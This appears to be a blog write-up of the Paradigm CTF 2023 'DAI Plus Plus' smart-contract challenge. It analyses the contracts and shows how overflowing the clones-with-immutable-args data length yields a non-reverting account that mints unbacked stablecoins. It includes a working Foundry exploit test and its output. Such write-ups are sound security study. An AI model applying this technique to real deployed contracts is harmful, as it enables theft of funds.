---
title: Paradigm 2023 DAI Plus Plus
date: 2024-09-14 13:08:14
tags:
---

### Introduction

As part of the `Web3 CTF Intensive Co-learning` with DeFiHackLabs, I solved multiple CTF challenges, including those from Paradigm CTF, BlazCTF, and more. In this post, I’ll share my experience solving the DAI Plus Plus challenge, which was interesting and I learned a lot.

Paradigm CTF 2023 DAI Plus Plus Challenge Link: https://github.com/paradigmxyz/paradigm-ctf-2023/tree/main/dai-plus-plus

### Challenge Overview

In the `Challenge.sol` function, a `SystemConfiguration` variable is created, and our goal is to mint more than `1,000,000,000,000 ether` of stable coins.

There are four contracts in this challenge: `SystemConfiguration`, `Stablecoin`, `AccountManager`, and `Account`.

Let’s first take a look at the `SystemConfiguration` file, which contains all the administrative operations, managing the `accountImplementation`, `ethUsdPriceFeed`, `accountManager`, `stablecoin`, `collateralRatio`, and `_systemContracts`. The owner, configured during the construction phase, can update these variables, while ordinary users can only view them through the getter functions.

In the `Stablecoin.sol` file, the `Stablecoin` contract is an ERC-20 token that includes `mint` and `burn` operations. These operations can only be performed if the `SystemConfiguration` account specified in the contract authorizes the operation for the `msg.sender`.

In the `AccountManager` contract, all account activities are managed, and users can create an account instance through `AccountManager::openAccount`. The contract uses the `clones-with-immutable-args` library for account creation, implementing the `EIP-1167` minimal proxy pattern. Additionally, users can mint and burn stablecoins or migrate their accounts.

Finally, there is the `Account` contract. For every operation in `AccountManager`, an `Account` instance will be passed as a parameter. Users can call `Account::increaseDebt` and `Account::decreaseDebt` within the `Account` contract; however, the `increaseDebt` operation will verify whether it affects the health factor, which is checked in `Account::isHealthy`. Users can also call `Account::recoverAccount` for account migration.

Alright, do you notice anything unusal in the contract?

### Vulnerability Analysis

**Health Factor**

As a first step, I examined the `Account::isHealthy` function to ensure there are no issues with the health factor calculation, which could otherwise allow the attacker to mint an unexpected amount of tokens.

The `Account::isHealthy` function takes two arguments: `collateralDecrease` and `debtIncrease`. I notice that only one value will be non-zero at a time, so we can simplify the problem into two cases.

In the first scenario, when `collateralDecrease` is a non-zero value, it means that we want to decrease our collateral by withdrawing some of the deposited ether. The `totalBalance` will be calculated as `address(this).balance - collateralDecrease`, while the `totalDebt` remains unchanged. The function then fetches the price through the Chainlink oracle.

I reviewed the Chainlink oracle integration to check for potential issues, such as stale prices or using `latestAnswer()` instead of `latestRoundData()`, which does not verify the last updated time. However, the integration seems to be implemented correctly.

You can check the details here: 

(1) Chainlink Oracle Security Considerations: https://medium.com/cyfrin/chainlink-oracle-defi-attacks-93b6cb6541bf#99af
(2) How Chainlink Price Feeds Work: https://www.rareskills.io/post/chainlink-price-feed-contract

Now, let’s move on to the return statement. This part seems interesting:

```C
totalBalance * ethPrice / 1e8 >= totalDebt * configuration.getCollateralRatio() / 10000
```

(Oops, the code block does not support Solidity syntax)

Wow, this might look a bit complex at the first sight. What do `1e8` and `10000` represent?

On the left-hand side, the collateral value in USD is calculated. The value is divided by `1e8` because the price feed from the Chainlink oracle has 8 decimal places.

On the right-hand side, we calculate the maximum amount we can borrow based on the current debt. The division by `10,000` is used because the `getCollateralRatio` is `15,000`, meaning `15000 / 10000 = 1.5`. This implies that for every 15 collateral tokens deposited, you can borrow up to 10 tokens. Here, we multiply first and then perform the division to prevent precision loss. It looks like that exchange rate manipulation is not possible here.

That's great. What about the second scenario? When the `debtIncrease` is a non-zero value and `collateralDecrease` is zero, it means we want to deposit collateral and receive stablecoins in return. This process follows the same steps as described earlier.

There are several operations that check the heath factor through `Account::isHealthy`, including `Account::increaseDebt`, `Account::decreaseDebt`, and more. Hmm, after going through the walkthrough, it seems that we cannot use this to exploit the challenge.

With the health factor checks out of the way, let's move on to `Access Control` and `Account Recovery` mechanisms.

**Access Control**

Are there any issues here? I checked the account validation in `onlyValidAccount` modifier, but everything seems fine.

**Account Recovery**

In the `Account::recoverAccount` function, we collect signatures from the recovery accounts and ensure that the signers, as recovered by the `ECDSA` algorithm, match the recovery addresses. I initially thought there might be issues with `ecrecover`, such as the precompile returning a zero address on failure, but everything looks good. 

LGTM!

Therefore, `Account::recoverAccount` and `AccountManager::migrateAccount` seem to be safe.

**Account Creation**
Finally, I reviewed the `AccountManager::openAccount` function, which uses the `clones-with-immutable-args` library to create new accounts. I started by examining the library and noticed a comment in the `clone()` function.

```C
    /// @notice Creates a clone proxy of the implementation contract, with immutable args
    /// @dev data cannot exceed 65535 bytes, since 2 bytes are used to store the data length
    /// @param implementation The implementation contract to clone
    /// @param data Encoded immutable args
    /// @param value The amount of wei to transfer to the created clone
    /// @return instance The address of the created clone
    function clone(
        address implementation,
        bytes memory data,
        uint256 value
    ) internal returns (address payable instance) {
        bytes memory creationcode = getCreationBytecode(implementation, data);
        // solhint-disable-next-line no-inline-assembly
        assembly {
            instance := create(
                value,
                add(creationcode, 0x20),
                mload(creationcode)
            )
        }
        if (instance == address(0)) {
            revert CreateFail();
        }
    }
```

There is a restriction on the data length: if it exceeds `65,535` bytes, it will overwrite the bytes that record the data length. To understand the impact of this scenario, I wrote a simple test.

```C
address[] memory recoveryAddrs = new address[](2044);
Acct account = manager.openAccount(
    address(this),
    recoveryAddresses
);
// Account Address
console.log(address(account));
// Byte Code Deployed Under Account
console.logBytes(address(account).code);
```

When the length of the recovery address array exceeds `2044`, the total data length surpasses the boundary. To observe the effects, we can check the bytecode deployed at the account address. The results are as follows:

```C
[PASS] testDAIPlusPlus() (gas: 944197)
Logs:
  0x231736AeF8Cd8eC2f21Ad7d9F7747965980d9e3e
  0x363d
```

The deployed code is `0x363d`, which indicates that it will not revert since there is no `REVERT` opcode included. This allows us to use this account to mint stablecoins through `AccountManager::mintStablecoins`, bypassing the `Account::increaseDebt` function, as the opcode does not execute any operation.

The full script is shown below:

```C
function testDAIPlusPlus() public {
    address[] memory recoveryAddresses = new address[](2044);
    Acct account = manager.openAccount(
        address(this),
        recoveryAddresses
    );
    // Account Address
    console.log(address(account));
    // Byte Code Deployed Under Account
    console.logBytes(address(account).code);
    manager.mintStablecoins(account, 1_000_000_000_000 ether + 1 wei, "");
}
```

Run the test, and you'll see that we can increase the token balance to over `1,000,000,000,000 ether`, successfully passing this challenge.

### Closing

This vulnerability lies in the `clones-with-immutable-args` library. Perhaps I can dive deeper into this pattern in my next blog post.

### Reference

[1] Fuzzland Writeup: https://github.com/fuzzland/writeup/blob/master/paradigm.md#dai